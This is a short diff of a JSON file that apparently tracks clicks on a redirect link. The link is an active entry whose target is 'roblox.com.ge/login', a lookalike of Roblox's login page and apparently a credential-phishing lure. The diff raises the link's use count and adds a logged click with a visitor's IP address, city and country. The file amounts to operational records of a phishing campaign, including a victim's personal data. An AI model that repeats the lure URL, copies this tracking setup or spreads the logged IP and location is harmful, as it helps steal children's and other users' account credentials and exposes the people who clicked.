@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1298,
+    "useCount": 1299,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10528,6 +10528,14 @@
         "city": "Bridgetown",
         "flag": "🇧🇧",
         "countryCode": "BB"
+      },
+      {
+        "timestamp": 1777372467707,
+        "ip": "139.135.192.171",
+        "country": "Philippines",
+        "city": "Angeles City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
